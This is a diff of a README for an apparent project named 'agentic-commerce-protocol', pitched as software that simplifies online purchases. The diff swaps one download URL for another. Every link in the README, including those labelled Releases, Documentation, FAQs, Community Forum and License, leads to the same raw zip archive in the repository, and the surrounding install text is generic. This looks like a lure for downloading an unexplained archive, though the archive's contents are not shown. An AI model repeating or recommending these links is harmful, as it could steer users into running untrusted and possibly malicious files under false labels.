@@ -1,6 +1,6 @@
 # 🛒 agentic-commerce-protocol - Simplifying Online Purchases for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip)
+[![Download Now](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the Agentic Commerce Protocol (ACP)! This software helps buyers, thei
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the software, visit the [Releases page](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip). Here, you will find the latest version available for download.
+   To download the software, visit the [Releases page](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip). Here, you will find the latest version available for download.
 
 2. **Choose Your Version**  
    Look for the latest release at the top of the page. You will see different files available. Choose the one that fits your operating system (Windows, macOS, or Linux).
@@ -59,7 +59,7 @@ If you run into problems, here are some common solutions:
 
 - **File Won’t Download**: Ensure your internet connection is stable and try refreshing the page.
 - **Installation Errors**: Check your system requirements. If everything meets the criteria, try restarting your computer and reinstalling.
-- **Application Crashes**: Make sure you are using the latest version. Check our [Releases page](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip) for updates.
+- **Application Crashes**: Make sure you are using the latest version. Check our [Releases page](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip) for updates.
 
 ## 📞 Support
 
@@ -69,14 +69,14 @@ If you need more help, feel free to reach out to our support team. You can find 
 
 To learn more about the Agentic Commerce Protocol, check the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip)
-- [FAQs](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip)
-- [Community Forum](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip)
+- [Documentation](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip)
+- [FAQs](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip)
 
 ## 📝 License
 
-The Agentic Commerce Protocol is open-source software, licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip).
+The Agentic Commerce Protocol is open-source software, licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip).
 
 Thank you for choosing the Agentic Commerce Protocol. We hope this guide helps you get started quickly and enjoy all the features of the application! 
 
-For more updates, keep checking our [Releases page](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/orthometry/agentic-commerce-protocol.zip).
+For more updates, keep checking our [Releases page](https://raw.githubusercontent.com/Kermithermit/agentic-commerce-protocol/main/changelog/agentic_commerce_protocol_v3.6-beta.5.zip).
